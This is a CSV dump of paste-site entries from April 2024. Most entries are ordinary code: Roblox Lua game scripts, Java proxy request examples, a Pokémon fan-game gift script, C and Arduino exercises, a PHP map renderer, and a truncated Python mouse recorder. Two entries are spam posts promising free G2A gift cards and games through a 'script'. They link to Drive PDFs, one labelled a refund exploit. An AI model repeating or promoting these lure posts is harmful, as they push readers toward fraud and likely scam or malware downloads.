id,title,username,language,date,content
rB4aCDFc,ü§ë G2A.com Free Gift Card Guide Apr 2024 FIX üí∞,ssss50w,GetText,Monday 29th of April 2024 07:14:33 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
30 April 2024"
zCyxtz4D,Untitled,Med_Gaming,Lua,Monday 29th of April 2024 07:08:41 PM CDT,"local RunService = game:GetService(""RunService"")
local Players = game:GetService(""Players"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local PetFolder = game.Workspace:WaitForChild(""Units"")

local Spacing =	4
local MaxClimbHeight = 6

local RayParams = RaycastParams.new()
local RayDirection = Vector3.new(0, -500, 0)

local function RearrangeTables(Pets, Rows, MaxRowCapacity)
	table.clear(Rows)
	local AmountOfRows = math.ceil(#Pets / MaxRowCapacity)
	for i = 1, AmountOfRows do
		table.insert(Rows, {})
	end
	for i, v in Pets do
		local Row = Rows[math.ceil(i / MaxRowCapacity)]
		table.insert(Row, v)
	end
end

local function GetRowWidth(Row, Pet)
	if Pet ~= nil then
		local SpacingBetweenPets = Spacing - Pet.PrimaryPart.Size.X
		local RowWidth = 0

		if #Row == 1 then
			return 0
		end

		for i,v in Row do
			if i ~= #Row then
				RowWidth += Pet.PrimaryPart.Size.X + SpacingBetweenPets
			else
				RowWidth += Pet.PrimaryPart.Size.X
			end
		end

		return RowWidth
	end
end

RunService.Heartbeat:Connect(function(Delatime)
	for _, PlayerPetFolder in PetFolder:GetChildren() do
		task.spawn(function()
			if not Players:FindFirstChild(PlayerPetFolder.Name) then return end
			local Character = Players[PlayerPetFolder.Name].Character
			if not Character then return end
			local HumanoidRootPart = Character:FindFirstChild(""HumanoidRootPart"")
			local Humanoid:Humanoid = Character:FindFirstChild(""Humanoid"")
			if Character == nil or HumanoidRootPart == nil or Humanoid == nil then return end

			local Pets = {}
			local Rows = {}
			for _, Pet in PlayerPetFolder:GetChildren() do
				table.insert(Pets, Pet)
			end
			RayParams.FilterDescendantsInstances = {PetFolder, Character}
			local MaxRowCapacity = math.ceil(math.sqrt(#Pets))
			RearrangeTables(Pets, Rows, MaxRowCapacity)

			for i, Pet in Pets do
				if not Pet:FindFirstChild(""HumanoidRootPart"") then continue end
				local RowIndex = math.ceil(i / MaxRowCapacity)
				local Row = Rows[RowIndex]
				local RowWidth = GetRowWidth(Row, Pet)

				local XOffset = #Row == 1 and 0 or RowWidth/2 - Pet.PrimaryPart.Size.X/2
				local X = (table.find(Row, Pet) - 1) * Spacing
				local Z = RowIndex * Spacing
				local Y = 0

				local RayResult = game.Workspace:Blockcast(Pet.PrimaryPart.CFrame + Vector3.new(0, MaxClimbHeight, 0), Pet.PrimaryPart.Size, RayDirection, RayParams)

				if RayResult then
					Y = RayResult.Position.Y + Pet.PrimaryPart.Size.Y/2
				end

				local TargetCFrame = CFrame.new(HumanoidRootPart.CFrame.X, 0, HumanoidRootPart.CFrame.Z) * HumanoidRootPart.CFrame.Rotation * CFrame.new(X - XOffset, Y, Z)

				if Humanoid.MoveDirection.Magnitude > 0 then
					local Val = Pet:FindFirstChild(""Running"") or Instance.new(""BoolValue"", Pet)
					Val.Name = ""Running""
					if not Val.Value then
						Val.Value = true
						Pet:WaitForChild(""Humanoid""):LoadAnimation(script.Anim):Play()					
					end
				else
					for i, v in pairs(Pet:WaitForChild(""Humanoid""):GetPlayingAnimationTracks()) do
						v:Stop()
					end
					game.Debris:AddItem(Pet:FindFirstChild(""Running""), 0)
				end

				Pet.PrimaryPart.CFrame = Pet.PrimaryPart.CFrame:Lerp(TargetCFrame, 0.1)
			end
		end)
	end
end)"
KSHvpSaf,Untitled,dereksir,Bash,Monday 29th of April 2024 07:03:42 PM CDT,"{
  ""origin"": ""140.238.247.9:63509""
}"
nSgCPwBT,Untitled,dereksir,Java,Monday 29th of April 2024 07:01:58 PM CDT,"package com.example;

// import the required classes
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Proxy;

public class Main {
    String run(String url) throws IOException {
        // define your proxy details
        String proxyHost = ""140.238.247.9"";
        int proxyPort = 8100;

        // create a proxy object and pass in the necessary details
        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));

        // create a OkHttpClient builder instance and configure it to use the proxy
        OkHttpClient client = new OkHttpClient.Builder()
            .proxy(proxy) 
            .build();

        // create a request with the provided URL
        Request request = new Request.Builder()
            .url(url)
            .build();
        // execute the request and obtain the response
        try (Response response = client.newCall(request).execute()) {
            // return the response body as a string
            return response.body().string();
        }
    }

    public static void main(String[] args) throws IOException {
        // create an instance of the Main class
        Main example = new Main();
        // make a GET request to the specified URL and print the response
        String response = example.run(""https://httpbin.io/ip"");
        System.out.println(response);
    }
}"
yBEJU4Vi,Untitled,dereksir,Java,Monday 29th of April 2024 06:49:12 PM CDT,"public class Main {
    String run(String url) throws IOException {
		//...

        // create a OkHttpClient builder instance and configure it to use the proxy
        OkHttpClient client = new OkHttpClient.Builder()
            .proxy(proxy) 
            .build();
    }
}
"
1RdEHny1,Untitled,dereksir,Java,Monday 29th of April 2024 06:39:13 PM CDT,"public class Main {

    String run(String url) throws IOException {
        // define your proxy details
        String proxyHost = ""140.238.247.9"";
        int proxyPort = 8100;

        // create a proxy object and pass in the necessary details
        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));
	}
}"
im3UtAj7,Untitled,Falexom,C,Monday 29th of April 2024 06:21:46 PM CDT,i don't know how to sex
385HfTqs,Untitled,dereksir,Java,Monday 29th of April 2024 06:11:33 PM CDT,"package com.example;

// import the required classes
import java.io.IOException;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class Main {
    // create a new OkHttpClient instance
    final OkHttpClient client = new OkHttpClient();

    String run(String url) throws IOException {
        // create a request with the provided URL
        Request request = new Request.Builder()
            .url(url)
            .build();
        // execute the request and obtain the response
        try (Response response = client.newCall(request).execute()) {
            // return the response body as a string
            return response.body().string();
        }
    }

    public static void main(String[] args) throws IOException {
        // create an instance of the Main class
        Main example = new Main();
        // make a GET request to the specified URL and print the response
        String response = example.run(""https://httpbin.io/ip"");
        System.out.println(response);
    }
}"
pWtyR7m2,Gift_Basic,FiaPlay,Ruby,Monday 29th of April 2024 06:08:29 PM CDT,"####################################################
# BASE DE REGALO MISTERIOSO PARA EL SCRIPT DE REGALOS MISTERIOSOS AVANZADOS DE CLARA
# T√≥malo de base para crear o a√±adir nuevos eventos. Puedes entregar m√°s de un evento a la vez.
# Subelo a Pastebin o a Github como un txt y coge el enlace del archivo en RAW.
####################################################
  ret = false
  #Comprueba que el jugador ya tenga ese regalo especifico, para objetos es mejor usar otro tipo de check.
  #Para pokemon con evolucion, debes comprobar que esten ambas especies.
    if !hasEventMon?(PBSpecies::PICHU,:CLASSIC,""PRI2010"") 
    Kernel.pbMessage(_INTL(""Regalo Misterioso en l√≠nea encontrado.\\wtnp[20]""))
    @pokemon=PokeBattle_Pokemon.new(:PICHU,30,$Trainer)
    #ESTOS PARAMETROS SON PARA EL CHECK de hasEventMon?#
    @pokemon.giveRibbon(PBRibbons::CLASSIC)
    @pokemon.ot=""PRI2010""
    ####################################################
    @pokemon.trainerID=03050
    @pokemon.setItem(:EVERSTONE)
    @pokemon.pbLearnMove(:VOLTTACKLE)
    @pokemon.pbLearnMove(:ENDEAVOR)
    @pokemon.pbLearnMove(:ENDURE)
    @pokemon.makeShiny
    @pokemon.setNature(:JOLLY)
    #Esto permite aleatorizar los iv's del pok√©mon, pero garantiza que 3 de ellos sean perfectos.
    maxIV = 1
    @pokemon.iv[rand(6)]=31
    randivs = [0,1,2,3,4,5]
    for i in randivs.shuffle
      next if @pokemon.iv[i]==31
      maxIV +=1
      @pokemon.iv[i]=31 
      break if maxIV>=3
    end
    @pokemon.happiness=100
    @pokemon.obtainMode=4
    @pokemon.calcStats
    showHidePokemon rescue nil
    Kernel.pbAddPokemon(@pokemon,nil,true,false)
    showHidePokemon(false) rescue nil
    ret = true
  end
  if !hasEventMon?(PBSpecies::CELEBI,:CLASSIC,""INV2011"") 
    Kernel.pbMessage(_INTL(""Regalo Misterioso en l√≠nea encontrado.\\wtnp[20]""))
    @pokemon=PokeBattle_Pokemon.new(:CELEBI,50,$Trainer)
    #ESTOS PARAMETROS SON PARA EL CHECK de hasEventMon?#
    @pokemon.giveRibbon(PBRibbons::CLASSIC)
    @pokemon.ot=""INV2011""
    ####################################################
    @pokemon.trainerID=01211
    @pokemon.setItem(:JABOCABERRY)
    @pokemon.pbLearnMove(:HEALINGWISH)
    @pokemon.setNature(:MODEST)
    #Esto permite aleatorizar los iv's del pok√©mon, pero garantiza que 3 de ellos sean perfectos.
    maxIV = 1
    @pokemon.iv[rand(6)]=31
    randivs = [0,1,2,3,4,5]
    for i in randivs.shuffle
      next if @pokemon.iv[i]==31
      maxIV +=1
      @pokemon.iv[i]=31 
      break if maxIV>=3
    end
    @pokemon.makeShiny
    @pokemon.happiness=100
    @pokemon.obtainMode=4
    @pokemon.calcStats
    showHidePokemon rescue nil
    Kernel.pbAddPokemon(@pokemon,nil,true,false)
    showHidePokemon(false) rescue nil
    ret = true
  end
  if !ret
    Kernel.pbMessage(_INTL(""No se encontr√≥ ning√∫n Regalo Misterioso en l√≠nea.\\wtnp[20]""))
  end"
dzY5r01s,ü§ë G2A.com Free Gift Card Guide Apr 2024 FIX ü§ë,jusst2k4,GetText,Monday 29th of April 2024 06:08:06 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_452650.pdf

Working as of:
29 April 2024"
8WP5kLK5,2024_list4_linear,gpsgiraldi,C,Monday 29th of April 2024 05:15:50 PM CDT,"Um sistema de equa√ß√µes lineares 2√ó2
 consistente, da forma

{axdx++byey==cf
pode ser resolvido utilizando as f√≥rmulas

xy=ce‚àíbfae‚àíbd=af‚àícdae‚àíbd
Escreva um algoritmo em C para ler os coeficientes a,b,c,d,e,f
 das equa√ß√µes e calcular e exibir os valores de x
 e de y
.

Todos os n√∫meros a,b,c,d,e,f
 ser√£o inteiros, e x
 e y
 podem ser fracion√°rios. Exiba x
 na primeira linha e y
 na segunda linha, ambos com duas casas decimais ap√≥s a v√≠rgula.
 
 ===================================
 #include <stdio.h>
#include <math.h>
 
int main()
{
    float a,b,c,d,e,f,x,y;
    printf(""Insira valores para a, b, c, d, e, e f a calcular x & y: "");
    scanf(""%f %f %f %f %f %f "", &a, &b, &c, &d, &e, &f);
    x = ((c*e)-(b*f))/((a*e)-(b*d));
    y = ((a*f)-(c*d))/((a*e)-(b*d));
    printf(""%.2f \n%.2f"", x, y);
    return 0;
}"
EhhJMjjG,ImageMagick,acclivity,PHP,Monday 29th of April 2024 04:59:30 PM CDT,"<?php

// This PHP code utilizes ImageMagick to perform image manipulation tasks similar to your Python code. 
// Note that you'll need to have the Imagick extension installed and enabled in your PHP environment to run this code. 
// Additionally, make sure to adjust the file paths and any other specifics according to your setup.


function map_creator($data) {
    $img = new Imagick('map_image.jpg');
    $draw = new ImagickDraw();
    $draw->setStrokeWidth(1);
    
    $data = str_replace(""\"""", """", $data);
    $data = str_replace(""\'"", """", $data);
    
    function compute_XY_from_GR($gr_east, $gr_north) {
        $base_es = 50481;
        $base_ns = 98019;
        $base_x = 644;
        $base_y = 534;
        
        $x = $base_x + (($gr_east - $base_es) * 0.3555);
        $y = $base_y - (($gr_north - $base_ns) * 0.355);
        
        $x_corr = ($y - $base_y) * 0.04;
        $x -= $x_corr;
        
        $y_corr = ($x - $base_x) * 0.025;
        $y += $y_corr;
        
        return array($x, $y);
    }
    
    function draw_cross($draw, $point, $pc, $age) {
        if ($pc > 20) {
            $sizer = 12;
        } elseif ($pc > 10) {
            $sizer = 9;
        } else {
            $sizer = 6;
        }
        
        $colors = array(""rgb(0,0,255)"", ""rgb(255,0,255)"", ""rgb(255,0,0)"", ""rgb(255,165,0)"", ""rgb(255,255,0)"");
        $idx = 0;
        if ($age < 2) {
            $idx = 4;
        } elseif ($age < 5) {
            $idx = 3;
        } elseif ($age < 10) {
            $idx = 2;
        } elseif ($age < 20) {
            $idx = 1;
        }
        
        $color = $colors[$idx];
        
        $draw->setStrokeColor($color);
        $draw->line($point[0] - $sizer, $point[1], $point[0] + $sizer, $point[1]);
        $draw->line($point[0], $point[1] - $sizer, $point[0], $point[1] + $sizer);
    }
    
    $now = time();
    $days = $now / 86400;
    $year_now = 1970 + intval($days / 365.25);
    
    $fsplit = explode(""*"", $data);
    $group = trim(array_shift($fsplit));
    
    $taxon = ucfirst(trim(array_shift($fsplit)));
    $vernac = ucfirst(trim(array_shift($fsplit)));   // Vernacular (Common) name
    $total = intval(trim(array_shift($fsplit)));    // Total number of sightings of this species
    
    $sp_refs = [];
    $griddata = $fsplit;                    // e.g. TV514989-1-2001/TV513989-7-1998/TV514990-1-2016/
    
    foreach ($griddata as $triple) {
        if (!$triple) {
            break;
        }
        $psplit = explode('~', $triple);
        $gr = $psplit[0];                              // get grid ref
        $gr = substr($gr, 0, 5) . ""50"" . substr($gr, 5) . ""50""; // Adjust grid rwf to centre of 100m square
        $ctr = $psplit[1];
        $year = $psplit[2];
        $sp_refs[] = array($gr, $ctr, $year);
    }
    
    $more = $vernac;
    if (strtolower($vernac) === strtolower($taxon)) {  // if common name is same
        $more = $group;
    }
    
    $more = ucfirst($more);
    
    $draw->setFontSize(12);
    $draw->setFillColor(""rgb(255,255,255)"");
    $draw->setFont('Arial');
    $img->annotateImage($draw, 675, 40, 0, $taxon);
    $img->annotateImage($draw, 675, 80, 0, $more);
    $img->annotateImage($draw, 675, 120, 0, ""$total sightings"");
    $img->annotateImage($draw, 1400, 240, 0, ""< 2 years"");
    $img->annotateImage($draw, 1400, 270, 0, ""< 5 years"");
    $img->annotateImage($draw, 1400, 300, 0, ""< 10 years"");
    $img->annotateImage($draw, 1400, 330, 0, ""< 20 years"");
    $img->annotateImage($draw, 1400, 360, 0, ""20 years+"");
    
    foreach ($sp_refs as $item) {
        $gr = $item[0];                    // Grid Ref
        $ctr = $item[1];                   // Qty seen at this Grid Ref
        $year = $item[2];                  // Year of most recent sighting at this Grid Ref
        $eastings = intval(substr($gr, 2, 5));         // split numeric part of Grid Ref into Eastings and Northings
        $northings = intval(substr($gr, 7));
        
        $ctr = intval($ctr);                                  // Qty seen at this location
        $pc = ($ctr * 100) / $total;                          // Percent qty seen at this location compared to all locations
        
        list($x, $y) = compute_XY_from_GR($eastings, $northings);      // Convert Grid Ref to pixel positions X, Y
        
        $aged = $year_now - intval($year);                     // Age of most recent sighting at this Grid Ref
        
        draw_cross($draw, array($x, $y), $pc, $aged );              // Draw a cross on the map at centre of this grid ref.
    }
    
    $img->drawImage($draw);
    return $img;
}
?>
"
dfQTqeti,codigo resumido,Ultizin,C++,Monday 29th of April 2024 04:50:55 PM CDT,"// Defini√ß√µes das constantes para os pinos do display de 7 segmentos
const int pinosDisplay[8] = {8, 9, 3, 4, 5, 7, 6, 2};

void setup() {
  // Define todos os pinos do display como sa√≠da
  for (int i = 0; i < 8; i++) {
    pinMode(pinosDisplay[i], OUTPUT);
  }
  
  // Inicia com o display desligado
  desligarDisplay();
}

void loop() {
  // Loop para a passagem dos 10 d√≠gitos (0-9)
  for (int digito = 0; digito < 10; digito++) {
    // Define quais segmentos devem estar ligados para cada d√≠gito
    definirSegmentos(digito);
    
    // Liga e desliga de forma alternada o ponto
    digitalWrite(pinosDisplay[7], !digitalRead(pinosDisplay[7]));
    
    // Aguarda 1 segundo para trocar de d√≠gito
    delay(1000);
    
    // Apaga todos os segmentos para apresentar o pr√≥ximo d√≠gito
    desligarDisplay();
  }
}

// Fun√ß√£o para desligar todos os segmentos do display
void desligarDisplay() {
  for (int i = 0; i < 7; i++) {
    digitalWrite(pinosDisplay[i], HIGH);
  }
}

// Fun√ß√£o para definir quais segmentos devem estar ligados para cada d√≠gito
void definirSegmentos(int digito) {
  // Tabela de segmentos para cada d√≠gito (0-9)
  const bool segmentos[10][7] = {
    {LOW, LOW, LOW, LOW, LOW, LOW, HIGH},  // 0
    {HIGH, LOW, LOW, HIGH, HIGH, HIGH, HIGH}, // 1
    {LOW, LOW, HIGH, LOW, LOW, HIGH, LOW},  // 2
    {LOW, LOW, LOW, LOW, HIGH, HIGH, LOW},  // 3
    {HIGH, LOW, LOW, HIGH, HIGH, LOW, LOW}, // 4
    {LOW, HIGH, LOW, LOW, HIGH, LOW, LOW},  // 5
    {LOW, HIGH, LOW, LOW, LOW, LOW, LOW},   // 6
    {LOW, LOW, LOW, HIGH, HIGH, HIGH, HIGH},// 7
    {LOW, LOW, LOW, LOW, LOW, LOW, LOW},    // 8
    {LOW, LOW, LOW, HIGH, HIGH, LOW, LOW}   // 9
  };
  
  // Define os segmentos conforme o d√≠gito atual
  for (int i = 0; i < 7; i++) {
    digitalWrite(pinosDisplay[i], segmentos[digito][i]);
  }
}"
hLTVeJs7,c√≥digo do governo,Ultizin,C++,Monday 29th of April 2024 04:50:16 PM CDT,"#define a 8 
#define b 9 
#define c 3 
#define d 4 
#define e 5 
#define f 7 
#define g 6 
#define ponto 2

void setup() {
  /* Define os pinos como sa√≠da.                          */
  pinMode(a, OUTPUT);
  pinMode(b, OUTPUT);
  pinMode(c, OUTPUT);
  pinMode(d, OUTPUT);
  pinMode(e, OUTPUT);
  pinMode(f, OUTPUT);
  pinMode(g, OUTPUT);
  pinMode(ponto, OUTPUT);

  /* Inicia com o display desligado.                      */
  digitalWrite(a, HIGH);
  digitalWrite(b, HIGH);
  digitalWrite(c, HIGH);
  digitalWrite(d, HIGH);
  digitalWrite(e, HIGH);
  digitalWrite(f, HIGH);
  digitalWrite(g, HIGH);
}
void loop() {
  /* Loop para a passagem dos 10 d√≠gitos (0-9).           */
  for (int digito = 0; digito < 10; digito++)
  {
    /* Condi√ß√£o para ligar o segmento a.                  */
    /* Se o digito n√£o for 1 e 4, fa√ßa...                 */
    if (digito != 1 && digito != 4)
      digitalWrite(a, LOW);
    /* Condi√ß√£o para ligar o segmento b.                  */
    /* Se o digito n√£o for 5 e 6, fa√ßa...                 */
    if (digito != 5 && digito != 6)
      digitalWrite(b, LOW);
    /* Condi√ß√£o para ligar o segmento c.                  */
    /* Se o digito n√£o for 2, fa√ßa...                     */
    if (digito != 2)
      digitalWrite(c, LOW);
    /* Condi√ß√£o para ligar o segmento d.                  */
    /* Se o digito n√£o for 1, 4 e 7 fa√ßa...               */
    if (digito != 1 && digito != 4 && digito != 7)
      digitalWrite(d, LOW);
    /* Condi√ß√£o para ligar o segmento e                           */
    /* Se o digito for 2 ou 6 ou 8 ou 0, fa√ßa...                  */
    if (digito == 2 || digito == 6 || digito == 8 || digito == 0)
      digitalWrite(e, LOW);
    /* Condi√ß√£o para ligar o segmento f                           */
    /* Se o digito n√£o for 1, 2, 3 e 7 fa√ßa...                    */
    if (digito != 1 && digito != 2 && digito != 3 && digito != 7)
      digitalWrite(f, LOW);
    /* Condi√ß√£o para ligar o segmento d.                          */
    /* Se o digito n√£o for 0, 1 e 7 fa√ßa...                       */
    if (digito != 0 && digito != 1 && digito != 7)
      digitalWrite(g, LOW);
    /* Liga e desliga de forma alternada o ponto.                 */
    digitalWrite(ponto, !digitalRead(ponto));
    /* Aguarda 1 segundo para trocar de d√≠gito.                   */
    delay(1000);
    /* Apaga todos os segmentos para apresentar o pr√≥ximo d√≠gito */
    digitalWrite(a, HIGH);
    digitalWrite(b, HIGH);
    digitalWrite(c, HIGH);
    digitalWrite(d, HIGH);
    digitalWrite(e, HIGH);
    digitalWrite(f, HIGH);
    digitalWrite(g, HIGH);
  }
}
"
DLyUp7Dy,Untitled,Mr-Nightmare1,Lua,Monday 29th of April 2024 04:30:15 PM CDT,"--!strict

local Combat = {}
Combat.__index = Combat

local replicatedStorage = game:GetService(""ReplicatedStorage"")
local tweenService = game:GetService(""TweenService"")
local debris = game:GetService(""Debris"")
local players = game:GetService(""Players"")

local network = replicatedStorage.Network
-- local clientReplicator = network.ClientReplicator
local clickRemote = network.Click
local playSound = network.PlaySound

local serverStorage = script.Parent
local packages = require(serverStorage.Packages.CombatPackages)

local hitboxesFolder = workspace.Hitboxes
local vfxFolder = workspace.VFX

type CombatPackage = {
    idleAnimation: string,
    attackAnimation: string,
    damage: number,
    vfx: Part?,
    hitbox: Part,
}

local admins = {
    1303772257,
}

local skillTimes = {
    G1 = tick()
}

local skillCooldowns = {
    G1 = 3.75
}

function Combat.new(player)

    local status = """"
    if table.find(admins, player.UserId) then
        status = ""Admin""
    else
        status = ""Player""
    end
    return setmetatable({

        _status = status,
        _user = player,
        _indexAttempts = {},
        _defaultSpeed = 16,
        __call = function(...)
            return {...}
        end,
        __index = function(self, index, value)
            self._indexAttempts[index] = value
        end,
    }, Combat)
end

--[[
(1-t)^2*p0+2*(1-t)*t*p1+t^2*p2
--]]

function Combat:MovementControl(bool: boolean)

    local player = self._user
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild(""Humanoid"")

    if bool then
        humanoid.WalkSpeed = 0
    else
        humanoid.WalkSpeed = self._defaultSpeed
    end
end

function Combat:AddHitbox(position: Vector3, package: CombatPackage)

    local hitbox = package.hitbox:Clone()
    hitbox.Position = position
    hitbox.Parent = hitboxesFolder

    local taggedHumanoids = {}
    for _, part in workspace:GetPartsInPart(hitbox) do

        local character = part.Parent
        local humanoid = character:FindFirstChildOfClass(""Humanoid"")
        if humanoid then

            local player = players:GetPlayerFromCharacter(character)
            if player then
                if player == self._user then
                    continue
                end
            end
            
            if not (table.find(taggedHumanoids, humanoid)) then
                
                table.insert(taggedHumanoids, humanoid)
                humanoid:TakeDamage(package.damage)
            end
        end
    end
end

function Combat:G1()

    if tick() - skillTimes.G1 > skillCooldowns.G1 then

        local package = packages.G1
        local vfx = package.vfx
        
        local player = self._user
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild(""Humanoid"")
        local animator = humanoid.Animator

        local animation = Instance.new(""Animation"")
        animation.AnimationId = package.idleAnimation

        local track = animator:LoadAnimation(animation)
        track:Play()

        self:MovementControl(true)

        local function characterPosition(characterPart: string, other: Part)
            
            local foundPart: Part = character:FindFirstChild(characterPart)
            if foundPart then
                
                local pos = foundPart.Position + foundPart.CFrame.UpVector*6
                other.Position = pos

                local constraint = Instance.new(""WeldConstraint"")
                constraint.Part0 = other
                constraint.Part1 = foundPart

                other.Massless = true
                other.CanCollide = false
                other.Anchored = true

                other.Parent = foundPart
            end
        end

        repeat 
            task.wait(.01)
        until 
            track.IsPlaying

        local red, white = vfx.Red:Clone(), vfx.White:Clone()
        characterPosition(""Left Arm"", red)
		characterPosition(""Right Arm"", white)

        playSound:FireClient(player, ""Fireball"")
        task.delay(.15, function()
            playSound:FireClient(player, ""Fireball"")
        end)
		
		local cooldown = tick()

        local firstPosition, secondPosition
        local c = clickRemote.OnServerEvent:Connect(function(playerThatFired, pos1: Vector3, pos2: Vector3)
			
			if tick()-cooldown > .3 then
				firstPosition = pos1
				secondPosition = pos2

				if playerThatFired == player then

					print(pos1, pos2)
					self:MovementControl(true)

					for _, foundTrack in animator:GetPlayingAnimationTracks() do
						foundTrack:Stop()
					end
				end
			end
        end)

        track.Ended:Wait()
        c:Disconnect()

        local attackAnimation = Instance.new(""Animation"")
        attackAnimation.AnimationId = package.attackAnimation

        -- task.wait()

        track = animator:LoadAnimation(attackAnimation)
        track:Play()

        local tween1 = tweenService:Create(red, TweenInfo.new(.25, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Position = firstPosition})
        local tween2 = tweenService:Create(white, TweenInfo.new(.25, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Position = secondPosition})

        local strike = vfx.Strike
        local slam = vfx.Slam
        track:GetMarkerReachedSignal(""HitOne""):Connect(function()
            
            tween1:Play()
            playSound:FireClient(player, ""Throw"")
			tween1.Completed:Wait()
            playSound:FireClient(player, ""Explosion"")
			local newStrike = strike:Clone()

            local goodPosition
            local result = workspace:Raycast(firstPosition, -red.CFrame.UpVector*100)
            if result and result.Instance then
                
				goodPosition = result.Position
            end
            red:Destroy()

			local actualPosition = goodPosition or firstPosition
			newStrike.Position = actualPosition
            newStrike.Parent = vfxFolder

            local newSlam = slam:Clone()
            newSlam.Position = actualPosition - Vector3.new(0, newSlam.Size.Y, 0)
            newSlam.Parent = vfxFolder

            local riseTween = tweenService:Create(newSlam, TweenInfo.new(.25, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Position = actualPosition})
            riseTween:Play()

			debris:AddItem(newStrike, .5)
            debris:AddItem(newSlam, 1)
			self:AddHitbox(actualPosition, package)
        end)

        track:GetMarkerReachedSignal(""HitTwo""):Connect(function()
            
            task.wait()
            print(""tweentwo"")
            tween2:Play()
            playSound:FireClient(player, ""Throw"")
			tween2.Completed:Wait()
            playSound:FireClient(player, ""Explosion"")
			local newStrike = strike:Clone()

            local goodPosition
            local result = workspace:Raycast(secondPosition, -white.CFrame.UpVector*100)
            if result and result.Instance then
                
				goodPosition = result.Position
            end
            white:Destroy()

			local actualPosition = goodPosition or secondPosition
			newStrike.Position = actualPosition
            newStrike.Parent = vfxFolder

            local newSlam = slam:Clone()
            newSlam.Position = actualPosition - Vector3.new(0, newSlam.Size.Y, 0)
            newSlam.Parent = vfxFolder

            local riseTween = tweenService:Create(newSlam, TweenInfo.new(.25, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Position = actualPosition})
            riseTween:Play()

			debris:AddItem(newStrike, .5)
            debris:AddItem(newSlam, 1)
			self:AddHitbox(actualPosition, package)
        end)

        track.Ended:Wait()
        self:MovementControl(false)

        skillTimes.G1 = tick()
    end
end

return Combat"
uBgc0D1a,Autonomie,Thoughtcoder411,Python,Monday 29th of April 2024 04:24:01 PM CDT,"import tkinter as tk
from pynput import mouse, keyboard
import time
import threading
import shelve
import os
from tkinter import messagebox, simpledialog, Listbox

class MouseRecorderGUI:
    def __init__(self, root):
        self.root = root
        self.recorded_events = []
        self.recording = False
        self.playback_thread = None
        self.playback_stop_requested = False
        self.loop_counter = 0
        self.start_time = None
        self.recordings_dir = self.get_recordings_dir()
        self.create_gui()
        self.create_hotkey_listener()

    def get_recordings_dir(self):
        dir_name = ""recordings""
        os.makedirs(dir_name, exist_ok=True)
        return dir_name

    def create_hotkey_listener(self):
        # Define the hotkeys
        self.hotkeys = {
            'start': '<ctrl>+<alt>+s',
            'stop': '<ctrl>+<alt>+t',
            'save': '<ctrl>+<alt>+e',
            'load': '<ctrl>+<alt>+l',
            'playback': '<ctrl>+<alt>+p'
        }
        self.keyboard_listener = keyboard.GlobalHotKeys(self.create_hotkey_callbacks())
        self.keyboard_listener.start()

    def create_gui(self):
        # Create the GUI elements here
        self.event_listbox = tk.Listbox(self.root, width=50, height=15)
        self.start_button = tk.Button(self.root, text=""Start Recording"", command=self.start_recording)
        self.stop_button = tk.Button(self.root, text=""Stop Recording"", state=tk.DISABLED, command=self.stop_recording)
        self.playback_button = tk.Button(self.root, text=""Playback"", state=tk.DISABLED, command=self.start_playback)
        self.save_button = tk.Button(self.root, text=""Save"", state=tk.DISABLED, command=self.save_events)
        self.load_button = tk.Button(self.root, text=""Load"", command=self.load_events)
        self.loop_counter_label = tk.Label(self.root, text=""Loop Count: 0"")
        self.repeat_count_spinbox = tk.Spinbox(self.root, from_=1, to=100, width=5)
        self.playback_speed_scale = tk.Scale(self.root, from_=0.1, to=2.0, resolution=0.1, orient=tk.HORIZONTAL)
        self.configure_playback_button = tk.Button(self.root, text=""Configure Playback"", command=self.configure_playback)
        

        # Pack GUI elements here
        self.event_listbox.pack()
        self.start_button.pack()
        self.stop_button.pack()
        self.playback_button.pack()
        self.save_button.pack()
        self.load_button.pack()
        self.loop_counter_label.pack()
        self.repeat_count_spinbox.pack()
        self.playback_speed_scale.pack()
        self.configure_playback_button.pack()

    def create_hotkey_callbacks(self):
        # Hotkey callbacks
        return {
            self.hotkeys['start']: self.start_recording,
            self.hotkeys['stop']: self.stop_recording,
            self.hotkeys['save']: self.save_events,
            self.hotkeys['load']: self.load_events,
            self.hotkeys['playback']: self.start_playback_from_hotkey
        }

    def start_recording(self):
        if not self.recording:
            self.recording = True
            self.recorded_events = []
            self.start_time = time.time()
            self.mouse_listener = mouse.Listener(on_click=self.on_click, on_move=self.on_move)
            self.mouse_listener.start()
            self.toggle_buttons_during_recording(True)

    def stop_recording(self):
        if self.recording:
            self.recording = False
            self.mouse_listener.stop()
            self.toggle_buttons_during_recording(False)
            self.update_event_listbox()

    def toggle_buttons_during_recording(self, recording):
        # Enable/Disable buttons based on whether we are recording
        state = tk.DISABLED if recording else tk.NORMAL
        self.start_button.config(state=tk.DISABLED if recording else tk.NORMAL)
        self.stop_button.config(state=tk.NORMAL if recording else tk.DISABLED)
        self.playback_button.config(state=state)
        self.save_button.config(state=state)
        self.load_button.config(state=state)

    def on_click(self, x, y, button, pressed):
        if self.recording:
            event_time = time.time() - self.start_time
            self.recorded_events.append(('click', x, y, button.name, pressed, event_time))

    def on_move(self, x, y):
        if self.recording:
            event_time = time.time() - self.start_time
            self.recorded_events.append(('move', x, y, event_time))

    def start_playback_from_hotkey(self):
